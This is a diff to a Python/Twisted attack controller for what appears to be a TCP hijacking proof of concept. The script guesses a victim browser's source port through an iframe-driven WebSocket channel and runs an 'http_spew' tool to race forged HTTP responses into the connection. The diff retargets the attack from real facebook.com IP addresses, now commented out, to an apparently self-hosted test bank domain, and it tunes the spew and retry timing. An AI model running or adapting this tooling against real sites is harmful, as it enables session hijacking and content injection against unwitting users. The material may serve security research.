@@ -72,15 +72,20 @@ TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_DOMAIN = 'www.facebook.com' # TTL = 30
 
 #VICTIM_SITE = '66.220.149.11' #OOPSS!! sorry for spamming this after facebook.com no longer pointed to it...
-VICTIM_SITE = '66.220.149.88'
-VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them
+#VICTIM_SITE = '66.220.149.88'
+#VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them (and then they added a 6th)
 
 # TODO: loop over all these to figure out which one we are during port
 # guessing...
-VICTIM_SITE_IPS = ['66.220.149.88', '66.220.158.11', '69.171.224.37', \
-                    '69.171.229.11', '69.171.242.11']
+#VICTIM_SITE_IPS = ['66.220.149.88', '66.220.158.11', '69.171.224.37', \
+#                    '69.171.229.11', '69.171.242.11']
 
-NEW_CONNECTION_PERIOD = 0.1
+#VICTIM_SITE = '184.169.195.56'
+VICTIM_SITE = '50.18.143.83'
+VICTIM_DOMAIN = 'bank.hobocomp.com'
+VICTIM_SITE_IPS = ['50.18.143.83', '184.169.195.56']
+
+NEW_CONNECTION_PERIOD = 0.01
 CONNECTION_TIMEOUT = 30.0
 SPEW_DELAY_US = '100'
 SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
@@ -143,8 +148,8 @@ class ControlWebSocket(Protocol):
                 return
         except OSError, e:
             print 'Error: %s' % e.strerror
-        os.execvp('./http_spew', ['./http_spew', '-p', '%d-%d' % (self.seq_spew_port, self.seq_spew_port + 1), \
-                    '-r',  '0', '-d', str(int(self.SPEW_DELAY_US) / 2), self.addr.host, \
+        os.execvp('./http_spew', ['./http_spew', '-p', '%d-%d' % (self.seq_spew_port, self.seq_spew_port), \
+                    '-r',  '0', '-d', str(int(self.SPEW_DELAY_US)), self.addr.host, \
                     '%s:80' % (VICTIM_SITE)])
 
     def getBucketPortRange(self):
@@ -179,7 +184,7 @@ class ControlWebSocket(Protocol):
         if (self.spewer_pid == None):
             self.spawnHTTPSpewer() 
         if (time.time() - self.last_init_iframe) < 60:
-            reactor.callLater(0.25, self.make_iframe)
+            reactor.callLater(float(self.RTT*2.5)/1000, self.make_iframe)
         else:
             # reset the whole thing, try again
             self.bucket = 0
@@ -191,7 +196,7 @@ class ControlWebSocket(Protocol):
             reactor.callLater(1, self.fireAgain)
 
     def init_iframe(self):
-        self.transport.write("init_iframe http://%s" % (VICTIM_DOMAIN))
+        self.transport.write("init_iframe http://%s/index.html" % (VICTIM_DOMAIN))
         self.last_init_iframe = time.time()                
         reactor.callLater(1, self.make_iframe)
 
@@ -232,7 +237,7 @@ class ControlWebSocket(Protocol):
             self.transport.write("Found port <b>%d</b> for %s" % (port, VICTIM_SITE_IPS[self.ip_guess_index])) 
 
             self.seq_spew_port = port + 1
-            reactor.callLater(1, self.init_iframe)
+            reactor.callLater(0.5, self.init_iframe)
 
             return
 
